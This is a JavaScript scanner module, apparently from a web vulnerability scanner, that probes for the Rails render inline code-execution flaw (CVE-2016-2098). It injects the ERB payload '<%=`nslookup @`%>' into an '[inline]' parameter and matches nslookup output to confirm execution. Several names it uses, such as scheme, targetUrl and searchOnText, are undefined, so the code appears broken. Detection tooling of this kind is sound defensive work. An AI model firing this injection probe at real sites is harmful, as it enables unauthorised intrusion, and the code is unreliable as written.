
const { CoreLayer, createReport, browerHttpJob } = require('../core/core.js')


function InjectionPatterns() {
    this.plainArray = [
        "*** Can&#x27;t find @: No answer"
    ];

    this.regexArray = [
        /(Non-authoritative\sanswer:)/i,
        /(Server:\s*.*?\nAddress:\s*)/i
    ];

}


class RailsRenderRCE extends CoreLayer {
    constructor(_coreobj_) {
        super(_coreobj_);
        this.scheme = scheme;
        this.inputIndex = inputIndex;
        this.variations = this.scheme.selectVariationsForInput(this.inputIndex);
        this.currentVariation = 0;
        this.foundVulnOnVariation = false;
        this.lastJob = null;
    }

    async request(_inputName_, _value_) {
        this.scheme.setTempInputName(this.inputIndex, _inputName_);
        this.scheme.setInputValue(this.inputIndex, _value_);
        this.lastJob = new browerHttpJob(this.browser);
        this.lastJob.url = targetUrl;
        await this.scheme.populateRequest(this.lastJob);
        await this.lastJob.execute();
        return !this.lastJob.wasError;
    }

    // alert(_inputName_, _testValue_, _matchedText_) {
    //     this.foundVulnOnVariation = true;

    //     let flags = [];

    //     let newVuln = {
    //         typeId: "Rails_render_inline_CVE-2016-2098.xml",
    //         path: this.scheme.path,
    //         tags: flags,
    //         highlights: [_matchedText_],
    //         details: {
    //             input_type: this.scheme.getInputTypeStr(this.inputIndex),
    //             input_name: this.scheme.getInputName(this.inputIndex),
    //             matched_text: _matchedText_ ? _matchedText_ : false
    //         },
    //         http: this.lastJob.getNativeObject(),
    //         ssl: scriptArg.target.url.protocol == 'https',
    //         parameter: this.scheme.getInputName(this.inputIndex),
    //         attackVector: _testValue_
    //     };

    //     scanState.addVuln(newVuln);
    // }

    async testInjection(_inputName_, _value_) {
        if (!await this.request(_inputName_, _value_)) return false;

        let matchedText = InjectionPatterns.searchOnText(this.lastJob.response.body);

        if (matchedText) {
            await this.alert(_inputName_, _value_, matchedText);
            return false;
        }

        return true;
    }

    async startTesting() {
        for (let i = 0; i < this.variations.count; i++) {
            if (this.foundVulnOnVariation) break;

            this.currentVariation = i;

            await this.scheme.loadVariation(this.variations.item(this.currentVariation));

            if (!await this.testInjection(this.scheme.getInputName(this.inputIndex) + '[inline]', '<%=`nslookup @`%>')) continue;
        }
    }
}

module.exports = RailsRenderRCE
